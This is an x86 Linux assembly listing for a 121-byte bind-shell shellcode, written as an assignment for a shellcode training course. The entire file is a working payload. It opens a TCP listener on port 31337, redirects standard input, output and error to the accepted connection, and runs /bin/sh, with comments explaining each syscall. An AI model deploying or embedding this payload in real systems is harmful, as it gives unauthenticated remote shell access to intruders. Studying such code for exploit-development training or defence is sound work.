; Title  : shell-bind-tcp (121 bytes)
; Author : Timo Humphrey
; Date   : March 29, 2014
; Note   : SLAE Assignment #1 (SLAE-564)

_start:
	jmp short call_shellcode

shellcode:
	; Set Registers to Nulls
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	pop edx		; pop address of port off stack.

	; Create socket (sockFD)
	push 0x6	; TCP 		(SYS_SOCKET argument)
	push 0x1	; SOCK_STREAM	(SYS_SOCKET argument)
	push 0x2	; AF_INET	(SYS_SOCKET argument)
	mov al, 0x66	; SOCKETCALL
	mov bl, 0x1	; SYS_SOCKET
	mov ecx, esp	; pointer to SYS_SOCKET arguments on stack.
	int 0x80

	mov esi, eax	; save created sockFD

	; Set sockFD to BIND
	xor eax, eax	; set eax to null
	push eax	; null
	push word [edx]	; port		(AddrStruct)
	push word 0x2	; AF_INET	(AddrStruct)
	mov ecx, esp	; get pointer to AddrStruct
	push 0x10	; length addr struct	(SYS_BIND argument)
	push ecx	; pointer to AddrStruct (SYS_BIND argument)
	push esi	; sockFD		(SYS_BIND argument)
	mov al, 0x66	; SOCKETCALL
	mov bl, 0x2	; SYS_BIND
	mov ecx, esp	; pointer to SYS_BIND arguments on stack.
	int 0x80

	; Set sockFD to LISTEN
	push 0x1	; backlog/queue	(SYS_LISTEN argument)
	push esi	; sockFD	(SYS_LISTEN argument)
	mov al, 0x66	; SOCKETCALL
	mov bl, 0x4	; SYS_LISTEN
	mov ecx, esp	; pointer to SYS_LISTEN arguments on stack.
	int 0x80

	; Set sockFD to ACCEPT
	push eax	; null		;ADDED breaks without a null.
	push esi	; sockFD	(SYS_ACCEPT argument)
	mov al, 0x66	; SOCKETCALL
	mov bl, 0x5	; SYS_ACCEPT
	mov ecx, esp	; pointer to SYS_ACCEPT arguments on stack.
	int 0x80

	mov esi, eax	; save ACCEPTed FD.

	; DUP2 - Modify sockFD with other FDs (STDIN(0), STDOUT(1), STDERR(2))
	xor ecx, ecx	; set ecx to null
	mov cl, 0x3	; set counter (also sets FD's: 2,1,0)
duploop:
	dec cl		; decrement counter
	mov al, 0x3f	; DUP2
	mov ebx, esi	; sockFD	(DUP2 argument)
	int 0x80
	mov esi, eax	; save modified sockFD
	jnz duploop	; run duploop again if ZF not set.

	; EXECVE - Execute a command on system (/bin/sh)
	xor eax, eax	; set eax to null
	xor ecx, ecx	; set ecx to null
	push ecx	; push null to terminate string
	push 0x68732f6e	; hs/n
	push 0x69622f2f	; ib//
	mov ebx, esp	; set pointer to executable
	push ecx	; null				;ADDED null
	push ebx	; pointer to executable		(EXECVE argument)
	mov al, 0xb	; EXECVE
	mov ecx, esp	; set ecx to pointer to executable (EXECVE argument)
	xor edx, edx	; set edx to null 		(EXECVE argument)
	int 0x80

call_shellcode:
	call shellcode
	port: db 0x7a,0x69
